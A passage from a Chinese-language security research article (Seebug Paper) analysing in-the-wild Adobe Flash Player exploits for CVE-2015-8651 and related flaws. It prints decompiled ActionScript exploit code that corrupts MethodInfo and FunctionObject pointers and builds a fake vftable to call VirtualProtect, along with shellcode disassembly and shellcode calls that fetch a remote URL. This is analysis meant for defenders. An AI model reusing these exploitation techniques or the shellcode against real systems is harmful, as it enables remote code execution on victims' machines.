    GCHeap::HeapBlock* GCHeap::AllocBlock(size_t size, bool& zero, size_t alignment)
    {
      uint32_t startList = GetFreeListIndex(size);
      HeapBlock *freelist = &freelists[startList]; // retrieving heap block from free list
      HeapBlock *decommittedSuitableBlock = NULL;
      ...

图64 GCHeap::AllocBlock函数

经过GetFreeListIndex函数中的一些计算后，此分配函数会从freelists数组中选取相应的堆块，并最终返回包含shellcode代码的页面。

此外，下述的doInitDelay方法实际上是Flash Player中的事件回调函数，当伪造的freelists结构被用到时，就会触发其中的JIT代码。

    
    
    public dynamic class Boot extends MovieClip
    {
      ...
      public function doInitDelay(_arg_1:*):void
      {
        Lib.current.removeEventListener(Event.ADDED_TO_STAGE, doInitDelay);
        start();
      }
    
      public function start():void
      {
        ...
        if (_local_2.stage == null)
        {
          _local_2.addEventListener(Event.ADDED_TO_STAGE, doInitDelay);
          ...
        };
      }

图65 周期性调用的doInitDelay方法

当上述方法被调用时，原先使用的某块内存会被置成保留状态，对新分配的内存程序会调用VirtualProtect函数将其页面属性设为RX。在此情况下，伪造的freelists元素所指向的内存区域最终会被用到。

    
    
    0:006> !address 16dc3000
    Usage: <unknown>
    Base Address: 16dc3000
    End Address: 17050000
    Region Size: 00010000 ( 64.000 kB)
    State: 00001000 MEM_COMMIT
    Protect: 00000020 PAGE_EXECUTE_READ
    Type: 00020000 MEM_PRIVATE
    Allocation Base: 16cf9000
    Allocation Protect: 00000001 PAGE_NOACCESS
    
    Content source: 1 (target), length: 1000

图66 目标内存的页属性变成了可读可执行

因此，攻击者采用的策略就是利用ByteArray对象的分配函数来获取特定大小的堆空间，并将其链接到freelists结构中，以便相应的堆内存能在周期性事件处理所调用的JIT生成器中被用到。通过这种方式，exploit还能将目标内存的页面属性从可读写转变成可读可执行。同时，由于在新的JIT空间初始化时，目标内存上的数据并没有被初始化，所以在这种情况下，包含有shellcode的ByteArray对象内容不会从JIT空间中消失，后面这些shellcode将被用于代码的执行。

此漏洞目前已经修复了，在JIT生成器重新使用freelists中的内存块前，那些现有内存中的数据都将被初始化，这有效清除了伪造的freelists结构中写入的shellcode，从而彻底杜绝这种攻击方式。

#### 5.2 MethodInfo._implGPR函数指针corruption

而在坊间发现的CVE-2015-8651利用样本中则采用了MethodInfo._implGPR函数指针corruption的方法来实现利用，相关定义如下。

    
    
    /**
    * Base class for MethodInfo which contains invocation pointers. These
    * pointers are private to the ExecMgr instance and hence declared here.
    */
    class GC_CPP_EXACT(MethodInfoProcHolder, MMgc::GCTraceableObject)
    {
      ...
     private:
      union {
        GprMethodProc _implGPR; <---        FprMethodProc _implFPR;
        FLOAT_ONLY(VecrMethodProc _implVECR;)
      };

图67 _implGPR函数指针的定义

当调用的JIT代码返回时，此函数指针将被用到。

    
    
    Atom BaseExecMgr::endCoerce(MethodEnv* env, int32_t argc, uint32_t *ap, MethodSignaturep ms)
    {
      ...
      AvmCore* core = env->core();
      const int32_t bt = ms->returnTraitsBT();
    
      switch(bt){
      ...
      default:
      {
        STACKADJUST(); // align stack for 32-bit Windows and MSVC compiler
        const Atom i = (*env->method->_implGPR)(env, argc, ap);
        STACKRESTORE();
        ...

图68 _implGPR函数会在JIT函数返回时被调用

为了实现_implGPR函数指针的corruption，此样本首先借助CustomByteArray对象进行堆喷，此对象的声明如下。

    
    
    public class CustomByteArray extends ByteArray
    {
      private static const _SafeStr_35:_SafeStr_10 = _SafeStr_10._SafeStr_36();
      public var _SafeStr_625:uint = 0xFFEEDD00;
      public var _SafeStr_648:uint = 4293844225;
      public var _SafeStr_629:uint = 0xF0000000;
      public var _SafeStr_631:uint = 0xFFFFFFFF;
      public var _SafeStr_633:uint = 0xFFFFFFFF;
      public var _SafeStr_635:uint = 0;
      public var _SafeStr_628:uint = 0xAAAAAAAA;
      public var _SafeStr_630:uint = 0xAAAAAAAA;
      public var _SafeStr_632:uint = 0xAAAAAAAA;
      public var _SafeStr_634:uint = 0xAAAAAAAA;
      public var _SafeStr_649:uint = 4293844234;
      public var _SafeStr_650:uint = 4293844235;
      public var _SafeStr_651:uint = 4293844236;
      public var _SafeStr_652:uint = 4293844237;
      public var _SafeStr_653:uint = 4293844238;
      public var _SafeStr_626:uint = 4293844239;
      public var _SafeStr_654:uint = 4293844240;
      public var _SafeStr_655:uint = 4293844241;
      public var _SafeStr_656:uint = 4293844242;
      public var _SafeStr_657:uint = 4293844243;
      public var _SafeStr_658:uint = 4293844244;
      public var _SafeStr_659:uint = 4293844245;
      public var _SafeStr_660:uint = 4293844246;
      public var _SafeStr_661:uint = 4293844247;
      public var _SafeStr_662:uint = 4293844248;
      public var _SafeStr_663:uint = 4293844249;
      public var _SafeStr_664:uint = 4293844250;
      public var _SafeStr_665:uint = 4293844251;
      public var _SafeStr_666:uint = 4293844252;
      public var _SafeStr_667:uint = 4293844253;
      public var _SafeStr_668:uint = 4293844254;
      public var _SafeStr_669:uint = 4293844255;
      public var _SafeStr_164:Object; <---      private var _SafeStr_670:Number;
      ...
      private var _SafeStr_857:Number;
      private var static:Number;
      private var _SafeStr_858:Number;
      ...
      private var _SafeStr_891:Number;
      public function CustomByteArray(_arg_1:uint)
      {
        endian = _SafeStr_35.l[_SafeStr_35.Illl];
        this._SafeStr_164 = this;
        this._SafeStr_653 = _arg_1;
        return;
        return;
      }
    }

图69 CustomByteArray类的定义

成员变量_SafeStr_164是其中需要corrupt的对象，它会指向_SafeStr_16._SafeStr_340，而_SafeStr_340被定义为一个包含多个参数的静态函数，不过其内部实现仅有一行代码。

    
    
    // _SafeStr_16 = "while with" (String#127, DoABC#2)
    // _SafeStr_340 = "const while" (String#847, DoABC#2)
    public class _SafeStr_16
    {
      ...
      private static function _SafeStr_340(... _args):uint <-- Corruption target method
      {
        return (0);
      }

图70 需要corrupt的目标函数

此外，通过堆喷能够保证CustomByteArray对象总会出现在地址0x0f4a0020处。

    
    
    0:000> dd 0f4a0020 <-- CustomByteArray is allocated at predictable address
    0f4a0020 595c5e54 20000006 1e0e3ba0 1e1169a0
    0f4a0030 0f4a0038 00000044 595c5da4 595c5db8
    0f4a0040 595c5dac 595c5dc0 067acca0 07501000
    0f4a0050 0af19538 00000000 00000000 2e0b6278
    0f4a0060 594f2b6c 0f4a007c 00000000 00000000
    0f4a0070 595c5db0 00000003 00000001*ffeedd00* <-- Start of object member data (public var _SafeStr_625:uint = 0xFFEEDD00)
    0f4a0080 ffeedd01 f0000000 ffffffff ffffffff
    0f4a0090 00000000 50cefe43 5f3101bc 5f3101bc
    0f4a00a0 a0cefe43 ffeedd0a ffeedd0b ffeedd0c
    0f4a00b0 ffeedd0d 00000f85 ffeedd0f ffeedd10
    0f4a00c0 ffeedd11 ffeedd12 ffeedd13 ffeedd14
    0f4a00d0 ffeedd15 ffeedd16 ffeedd17 ffeedd18
    0f4a00e0 ffeedd19 ffeedd1a ffeedd1b ffeedd1c
    0f4a00f0 ffeedd1d ffeedd1e ffeedd1f*16e7f371* <-- public var _SafeStr_164:Object (points to _SafeStr_16._SafeStr_340 MethodClosure)
    0f4a0100 e0000000 7fffffff e0000000 7fffffff
    0f4a0110 e0000000 7fffffff e0000000 7fffffff
    0f4a0120 e0000000 7fffffff e0000000 7fffffff
    0f4a0130 e0000000 7fffffff e0000000 7fffffff
    0f4a0140 e0000000 7fffffff e0000000 7fffffff
    0f4a0150 e0000000 7fffffff e0000000 7fffffff
    0f4a0160 e0000000 7fffffff e0000000 7fffffff
    0f4a0170 e0000000 7fffffff e0000000 7fffffff

图71 内存中dump的CustomByteArray对象

由上图可知目标对象_SafeStr_164的地址是0x16e7f370=0x16e7f371&0xfffffffe，指针的传递就是从这里开始的，下述日志信息给出了此exploit查找MethodInfo._implGPR字段以及将该指针重写为shellcode地址的过程。

    
    
    * ReadInt: 0f4a00fc 16e7f371 <- CustomByteArray is at 0f4a0000
    * ReadInt: 16e7f38c 068cdcb8 <- MethodClosure structure is at 16e7f370. Next pointer offset is 16e7f38c-16e7f370=1c.
    * ReadInt: 068cdcc0 1e0b6270 <- MethodEnv structure is at 068cdcb8 . Next pointer offset is 068cdcc0-068cdcb8=8
    * WriteInt: 1e0b6274 0b8cdcb0 (_SafeStr_340) -> 01fb0000 (Shellcode) <- Overwriting MethodInfo._impGPR pointer to shellcode location

图72 查找并corrupt掉MethodInfo._implGPR字段

可以看到查找过程为：CustomByteArray(0x0f4a0020)._SafeStr_164 ->
MethodClosure(0x16e7f370) -> MethodEnv(0x068cdcb8) -> MethodInfo (0x1e0b6270)
-> MethodInfo._implGPR(0x1e0b6274)。

MethodInfo._implGPR函数指针(0x1e0b6274处)最初指向的地址是0x0b8cdcb0，相应的反汇编结果如下：

    
    
    0b8cdcb0 55           push ebp
    0b8cdcb1 8bec         mov ebp,esp
    0b8cdcb3 90           nop
    0b8cdcb4 83ec18       sub esp,18h
    0b8cdcb7 8b4d08       mov ecx,dword ptr [ebp+8]
    0b8cdcba 8d45f0       lea eax,[ebp-10h]
    0b8cdcbd 8b1550805107 mov edx,dword ptr ds:[7518050h]
    0b8cdcc3 894df4       mov dword ptr [ebp-0Ch],ecx
    0b8cdcc6 8955f0       mov dword ptr [ebp-10h],edx
    0b8cdcc9 890550805107 mov dword ptr ds:[7518050h],eax
    0b8cdccf 8b1540805107 mov edx,dword ptr ds:[7518040h]
    0b8cdcd5 3bc2         cmp eax,edx
    0b8cdcd7 7305         jae 0b8cdcde
    0b8cdcd9 e8c231604d   call Flash!IAEModule_IAEKernel_UnloadModule+0x1fd760 (58ed0ea0)
    0b8cdcde 33c0         xor eax,eax
    0b8cdce0 8b4df0       mov ecx,dword ptr [ebp-10h]
    0b8cdce3 890d50805107 mov dword ptr ds:[7518050h],ecx
    0b8cdce9 8be5         mov esp,ebp
    0b8cdceb 5d           pop ebp
    0b8cdcec c3           ret

图73 _impGPR函数指针最初指向的内容

而修改后的MethodInfo._impGPR函数指针将会指向shellcode代码，其反汇编结果如下：

    
    
    01fb0000 60         pushad
    01fb0001 e802000000 call 01fb0008
    01fb0006 61         popad
    01fb0007 c3         ret
    01fb0008 e900000000 jmp 01fb000d
    01fb000d 56         push esi
    01fb000e 57         push edi
    01fb000f e83b000000 call 01fb004f
    01fb0014 8bf0       mov esi,eax
    01fb0016 8bce       mov ecx,esi
    01fb0018 e86f010000 call 01fb018c
    01fb001d e88f080000 call 01fb08b1
    01fb0022 33c9       xor ecx,ecx
    01fb0024 51         push ecx
    01fb0025 51         push ecx
    01fb0026 56         push esi
    01fb0027 05cb094000 add eax,4009CBh
    01fb002c 50         push eax
    01fb002d 51         push ecx
    01fb002e 51         push ecx
    01fb002f ff560c     call dword ptr [esi+0Ch]
    01fb0032 8bf8       mov edi,eax
    01fb0034 6aff       push 0FFFFFFFFh
    01fb0036 57         push edi
    01fb0037 ff5610     call dword ptr [esi+10h]
    01fb003a 57         push edi
    01fb003b ff5614     call dword ptr [esi+14h]
    01fb003e 5f         pop edi
    01fb003f 33c0       xor eax,eax
    01fb0041 5e         pop esi
    01fb0042 c3         ret

图74 shellcode代码

在完成MethodInfo._impGPR函数指针的corruption后，就可以调用_SafeStr_340上的call.apply或call.call方法闭包来触发shellcode的执行。

    
    
    private function _SafeStr_355(_arg_1:*)
    {
      return (_SafeStr_340.call.apply(null, _arg_1));
    }
    private function _SafeStr_362()
    {
      return (_SafeStr_340.call(null));
    }

图75 用于触发shellcode执行的代码

### 6 FunctionObject对象的corruption

对于FunctionObject对象的corruption已经是屡见不鲜了，那些源自Hacking Team的exploit（CVE-2015-0349,
CVE-2015-5119, CVE-2015-5122, CVE-2015-5123）就很好的展示了相关技术。

以下是FunctionObject对象中AS3_call和AS3_apply方法的相关声明。

    
    
    class GC_AS3_EXACT(FunctionObject, ClassClosure)
    {
      ...
      // AS3 native methods
      int32_t get_length();
      Atom AS3_call(Atom thisAtom, Atom *argv, int argc);
      Atom AS3_apply(Atom thisAtom, Atom argArray);
      ...

图76 AS3_call和AS3_apply方法的声明

    
    
    Atom FunctionObject::AS3_apply(Atom thisArg, Atom argArray)
    {
      thisArg = get_coerced_receiver(thisArg);
      ...
      if (!AvmCore::isNullOrUndefined(argArray))
      {
        AvmCore* core = this->core();
        ...
        return core->exec->apply(get_callEnv(), thisArg, (ArrayObject*)AvmCore::atomToScriptObject(argArray));
      }

图77 FunctionObject::AS3_apply的定义

    
    
    /**
    * Function.prototype.call()
    */
    Atom FunctionObject::AS3_call(Atom thisArg, Atom *argv, int argc)
    {
      thisArg = get_coerced_receiver(thisArg);
      return core()->exec->call(get_callEnv(), thisArg, argc, argv);
    }

图78 FunctionObject::AS3_call的定义

如下定义了FunctionObject::AS3_call和FunctionObject::AS3_apply方法中用到的ExecMgr类。

    
    
    class ExecMgr
    {
      ...
      /** Invoke a function apply-style, by unpacking arguments from an array */
      virtual Atom apply(MethodEnv*, Atom thisArg, ArrayObject* a) = 0;
      /** Invoke a function call-style, with thisArg passed explicitly */
      virtual Atom call(MethodEnv*, Atom thisArg, int32_t argc, Atom* argv) = 0;

图79 ExecMgr中apply和call的定义

代号DUBNIUM行动中CVE-2015-8651的利用样本就借助了非常特殊的方式对FunctionObject对象进行corrupt，并通过其中的apply和call方法实现了shellcode的执行。此手法与15年7月Hacking
Team事件中泄漏的利用方法非常相似。

    
    
    package
    {
      public class Trigger
      {
        public static function dummy(... _args):void
        {
    
        }
      }
    }

图80 Trigger类中定义的dummy方法

下述代码说明了如何借助泄露的对象地址来获取FunctionObject对象的vftable指针。

    
    
    Trigger.dummy();
    var _local_1:uint = getObjectAddr(Trigger.dummy);
    var _local_6:uint = read32(((read32((read32((read32((_local_1 + 0x08)) + 0x14)) + 0x04)) + ((isDbg) ? 0xBC : 0xB0)) + (isMitis * 0x04))); <- _local_6 holds address to FunctionObject vptr pointer
    var _local_5:uint = read32(_local_6);

图81 获取FunctionObject对象的vftable指针

当然，这种计算偏移的方式有点死，其中用到的偏移量与Adobe Flash Player的内部数据结构以及这些结构在内存中的组织形式有关。

随后，这个泄漏的vftable指针会被一个伪造指针所覆盖，但除了将其中指向apply方法的指针用VirtualProtect函数地址替换外，指向的其余内容都是相同的。这样，当此corrupt后的FunctionObject对象调用apply方法时，它实际上就会调用到VirtualProtect函数，所给参数指向了用于临时保存shellcode的内存，通过这种方式可将其页面属性设成RWX(可读/可写/可执行)。

    
    
    var virtualProtectAddr:uint = getImportFunctionAddr("kernel32.dll", "VirtualProtect"); // resolving kernel32!VirtualProtect address
    if (!virtualProtectAddr)
    {
      return (false);
    };
    var _local_3:uint = read32((_local_1 + 0x1C));
    var _local_4:uint = read32((_local_1 + 0x20));
    
    //Build fake vftable
    var _local_9:Vector.<uint> = new Vector.<uint>(0x00);
    var _local_10:uint;
    while (_local_10 < 0x0100)
    {
      _local_9[_local_10] = read32(((_local_5 - 0x80) + (_local_10 * 0x04)));
      _local_10++;
    };
    
    //Replace vptr
    _local_9[0x27] = virtualProtectAddr;
    var _local_2:uint = getAddrUintVector(_local_9);
    write32(_local_6, (_local_2 + 0x80)); // _local_6 holds the pointer to FunctionObject
    write32((_local_1 + 0x1C), execMemAddr); // execMemAddr points to the shellcode memory
    write32((_local_1 + 0x20), 0x1000);
    var _local_8:Array = new Array(0x41);
    Trigger.dummy.call.apply(null, _local_8); // call kernel32!VirtualProtect upon shellcode memory

图82 虚之apply，实则VirtualProtect

以下是处理apply方法调用的反汇编代码。

    
    
    6cb92679 b000   mov al,0
    6cb9267b 0000   add byte ptr [eax],al
    6cb9267d 8b11   mov edx,dword ptr [ecx] <-- read corrupt vftable 07e85064
    6cb9267f 83e7f8 and edi,0FFFFFFF8h
    6cb92682 57     push edi
    6cb92683 53     push ebx
    6cb92684 50     push eax
    6cb92685 8b4218 mov eax,dword ptr [edx+18h]
    6cb92688 ffd0   call eax <-- Calls kernel32!VirtualProtect

图83 读取corrupt后的vftable指针

当exploit将0x6cb9267d指令处ecx所指向的vftable指针替换掉后，程序将转而执行VirtualProtect调用，下述为覆盖vftable指针时的日志信息。

    
    
    WriteInt 07e85064 6d19a0b0 -> 080af90c  <-- Corrupt vftable pointer

图84 覆盖vftable指针

    
    
    0:031> dds ecx
    07e85064 080af90c <- pointer to vftable
    07e85068 07e7a020
    07e8506c 07e7a09c
    07e85070 00000000
    07e85074 00000000
    07e85078 6d19cc70
    07e8507c 651864fd

图85 0x07e85064处的指针指向伪造的vftable结构

可以看到原先指向AS3_apply方法的函数指针此时指向的是VirtualProtect函数。

    
    
    0:031> dds edx
    080af90c 6cb72770
    080af910 6cb72610
    080af914 6cb73990
    080af918 6cb73a10
    080af91c 6cb9d490
    080af920 6cd8b340
    080af924 6cb73490
    080af928 75dc4317 kernel32!VirtualProtect <-- corrupt vptr
    080af92c 6cb72960
    080af930 6cab4830
    080af934 6cb73a50
    ...

图86 伪造的vftable结构

在借助VirtualProtect函数完成shellcode所在页的RWX属性设置后，exploit将使用FunctionObject对象的call方法实现接下来的代码执行，之所以不再使用apply方法是因为此过程不需要再传递任何参数了，并且调用call方法也更简单。

    
    
    Trigger.dummy();
    var _local_2:uint = getObjectAddr(Trigger.dummy);
    var functionObjectVptr:uint = read32(((read32((read32((read32((_local_2 + 0x08)) + 0x14)) + 0x04)) + ((isDbg) ? 0xBC : 0xB0)) + (isMitis* 0x04))); // Locate FunctionObject vptr pointer in memory
    var _local_3:uint = read32(_local_4);
    if ((((!((sc == null)))) && ((!((sc == execMem))))))
    {
      execMem.position = 0x00;
      execMem.writeUnsignedInt((execMemAddr + 0x04));
      execMem.writeBytes(sc);
    };
    write32(functionObjectVptr, (execMemAddr - 0x1C)); // 0x1C is the call pointer offset in vptr
    Trigger.dummy.call(null);

图87 通过call方法来执行shellcode

此外，这个shellcode执行程序是高度模块化的，甚至可以直接通过传递API函数名和参数的方式来让shellcode执行所需的功能，这就使得shellcode的构建变得非常有扩展性。

    
    
    _local_5 = _se.callerEx("WinINet!InternetOpenA", new <Object>["stilife", 0x01, 0x00, 0x00, 0x00]);
    if (!_local_5)
    {
      return (false);
    };
    _local_18 = _se.callerEx("WinINet!InternetOpenUrlA", new <Object>[_local_5, _se.BAToStr(_se.h2b(_se.urlID)), 0x00, 0x00, 0x80000000, 0x00]);
    if (!_local_18)
    {
      _se.callerEx("WinINet!InternetCloseHandle", new <Object>[_local_5]);
      return (false);
    };

图88 shellcode中的部分调用

在这个样本中，shellcode不再是内存中一段连续的指令代码了，而是由分散的各部分调用函数组成的，我们可以直接在实现ActionScript的native层代码上设置断点来跟踪这些调用，例如，下述反汇编结果给出的是进行InternetOpenUrlA调用的那部分shellcode代码。

    
    
    * AS3 Call
    08180024 b80080e90b mov eax,0BE98000h
    08180029 94         xchg eax,esp
    0818002a 93         xchg eax,ebx
    0818002b 6800000000 push 0
    08180030 6800000000 push 0
    08180035 6800000000 push 0
    0818003a 6801000000 push 1
    0818003f 68289ed40b push 0BD49E28h
    08180044 b840747575 mov eax,offset WININET!InternetOpenA (75757440) <- Call to WININET! InternetOpenA
    08180049 ffd0       call eax
    0818004b bf50eed40b mov edi,0BD4EE50h

图89 调用InternetOpenUrlA的那部分shellcode

最后需要注意下，借助FunctionObject对象的corrupt来实现CFG保护的绕过只对Win10或Win8.1中的IE11有效，Win10中的Edge是不受影响的。

### 7 结论

在逆向Flash利用样本的过程中我们并没有被赋予太多的自由。首先，Flash Player本身是一个庞大的二进制项目，但却没有提供任何的符号文件给研究人员。
其次，很多与漏洞相关的逻辑实际上发生在AVM2的内部，这对研究人员来说是非常有问题的，因为目前并没有太多的工具能用于SWF文件的插桩和调试。
我们的策略是从字节码插桩开始并逐渐添加那些帮助性的代码，这在Flash模块或JIT层面的调试中可以选择性的使用。另外，对那些ByteArray相关的代码进行插桩能在很大程度上方便我们的调试，因为许多利用方式仍然会借助ByteArray对象的corruption来实现RW
primitives功能。

我们还发现最近的exploit都将关注点放到了MMgc上，因为通过解析内存和遍历对象可以达到访问其内部数据结构的目的，而一旦样本事先获取了RW
primitives，那么许多内部结构就很可能被用于实现代码的执行，借助随机化技术访问MMgc的内部结构可能会降低漏洞利用的成功率。此外，一个明显的事实是Flash漏洞在利用时不需要进行太多的堆喷，通常几兆字节的堆喷就非常有效了，因为堆布局有时是非常容易进行预测的，近段以来，这种堆布局和堆地址的可预测性也被大量的exploit所利用。

### 8 附录

#### 分析样本

CVE-ID | SHA1 | Discussed techniques  
---|---|---  
CVE-2015-0336 | 2ae7754c4dbec996be0bd2bbb06a3d7c81dc4ad7 | vftable corruption  
CVE-2015-5122 | e695fbeb87cb4f02917e574dabb5ec32d1d8f787 | Vector.length
corruption  
CVE-2015-7645 | 2df498f32d8bad89d0d6d30275c19127763d5568 | ByteArray.length
corruption  
CVE-2015-8446 | 48b7185a5534731726f4618c8f655471ba13be64 | GCBlock structure
abuse, JIT stack corruption  
CVE-2015-8651 (DUBNIUM) | c2cee74c13057495b583cf414ff8de3ce0fdf583 |
FunctionObject corruption  
CVE-2015-8651 (Angler) | 10c17dab86701bcdbfc6f01f7ce442116706b024 |
MethodInfo._implGPR corruption  
CVE-2016-1010 | 6fd71918441a192e667b66a8d60b246e4259982c |
ConvolutionFilter.matrix to tabStops type-confusion, MMgc parsing, JIT stack
corruption  
  
* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/224/>

